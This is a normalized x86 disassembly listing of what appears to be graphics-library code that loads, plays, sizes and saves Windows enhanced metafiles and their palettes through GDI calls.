add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4298ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404ef4
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40827c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_404174
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41b4f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298b2
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_4298bc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42993a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41b654
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4032e0
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404384
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40452c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429941
lea eax [ ebp - 0x8 ]
call sub_404120
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4299ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_429a58
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_429a58
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_429a58
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_429a2c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403390
mov eax [ esi + 0x8 ]
call sub_403390
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_429a58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41b4f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429a9c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41b4f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429b00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
call sub_429ac0
call sub_429ae0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_429b40
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_429b70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4032d8
mov edx eax
mov eax [ ebx + 0xc ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bd34
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_429ba4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_40351c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403390
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4035a4
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4035a4
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40358c
sub_429c50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_429ce0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403390
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4032d8
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429d30
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_429c50
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_429c50
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41bc50
mov edx ebx
mov eax esi
call sub_429c50
jmp r-xdata
pop esi
pop ebx
retn
sub_429d8c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_429ac0
mov ecx esi
mov edx ebx
call sub_429828
pop esi
pop ebx
pop ebp
retn 0x4
sub_429db0
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_429dd4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_429dfc
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_429f03
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404384
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_4298bc
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403390
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429e85
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f0a
lea eax [ ebp - 0x48 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_429e8a
mov eax [ ebp - 0x4 ]
call sub_403390
call sub_403b84
call sub_403bd8
mov eax [ ebx + 0xc ]
call sub_403390
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f0a
lea eax [ ebp - 0x48 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4035a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_429f14
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4032e0
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402c94
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_429f70
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_429fec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_429dfc
mov eax [ ebp - 0x8 ]
push eax
push sub_429f14
push ebp
call sub_429f70
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a068
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4260ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42a0a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42a118
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_42a578
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_42a5e0
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_42a140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a11f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
add esp 0xfffffff0
call sub_4036f4
sub_42a11f
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a140
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42a34c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427758
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
xor edx edx
push ebp
push sub_42a32f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a6f4
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a6dc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a6dc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a6f4
mov ecx eax
xor edx edx
xor eax eax
call sub_41a018
mov eax ebx
call sub_4043e0
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_42ad54
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42ad54
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4044a0
mov eax [ ebp - 0x20 ]
call sub_4045e0
jmp r-xdata
mov eax esi
call sub_4043e0
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_42ad18
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42ad18
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_427dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a336
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_4280a0
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_42a353
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a387
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_40375c
mov ebx edx
mov edi eax
mov eax edi
call sub_427d50
mov esi eax
xor edx edx
mov eax edi
call sub_427dd0
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_42ac14
mov edx ebx
and dl 0xfc
mov eax edi
call sub_42781c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_42a3dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4292c8
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a424
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42b5d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42a454
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_42b5d0
mov edx esi
mov eax ebx
call sub_41bc50
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_42b5cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_42a4e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_427d50
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_427d50
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_427d50
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_427d50
push eax
call SelectPalette
sub_42a578
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404120
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_40476c
mov eax [ esi ]
call sub_4045e0
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_4045e0
call sub_408c10
mov edx eax
mov eax esi
call sub_40476c
sub_42a5e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404120
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_40476c
mov eax [ ebx ]
call sub_4045e0
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_4045e0
call sub_408c10
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_404680
mov eax [ ebx ]
call sub_4045e0
call sub_408c10
mov edx eax
mov eax ebx
call sub_40476c
sub_42a678
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a850
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_42a70c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4260ac
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_42a798
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a850
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_42a7fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42ae08
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41dba4
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_42a9b4
mov edx esi
mov eax ebx
call sub_42a8e4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_42a850
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_42b5d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_42b5cc
pop esi
pop ebx
retn
sub_42a878
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_42ae08
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_42a9b4
mov edx esi
mov eax ebx
call sub_42a8e4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_42a8e4
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_42a850
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41ddd0
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42a9a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4029b0
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41ddd0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_428040
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a9ab
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
call sub_428040
sub_42a9b4
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_42a850
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_428040
lea eax [ ebp - 0x22 ]
call sub_428e90
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
